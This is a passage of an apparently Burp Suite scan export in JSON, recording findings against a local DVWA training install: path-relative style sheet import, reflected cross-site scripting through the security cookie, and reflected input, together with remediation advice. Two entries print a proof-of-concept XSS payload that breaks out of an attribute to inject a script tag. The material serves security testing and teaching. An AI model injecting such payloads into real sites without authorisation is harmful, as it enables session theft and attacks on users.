        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "61": {
        "\ufeffissue__serialNumber": "3.78879E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csp/",
        "issue__location": "/dvwa/vulnerabilities/csp/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "62": {
        "\ufeffissue__serialNumber": "8.75039E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_source.php",
        "issue__location": "/dvwa/vulnerabilities/view_source.php",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "63": {
        "\ufeffissue__serialNumber": "1.56633E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csp/",
        "issue__location": "/dvwa/vulnerabilities/csp/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>m8vro'&gt;&lt;script&gt;alert(1)&lt;/script&gt;p5b7y</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "64": {
        "\ufeffissue__serialNumber": "5.26024E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/captcha/",
        "issue__location": "/dvwa/vulnerabilities/captcha/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>tdofp'&gt;&lt;script&gt;alert(1)&lt;/script&gt;hzmji</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "65": {
        "\ufeffissue__serialNumber": "5.28786E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csp/",
        "issue__location": "/dvwa/vulnerabilities/csp/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
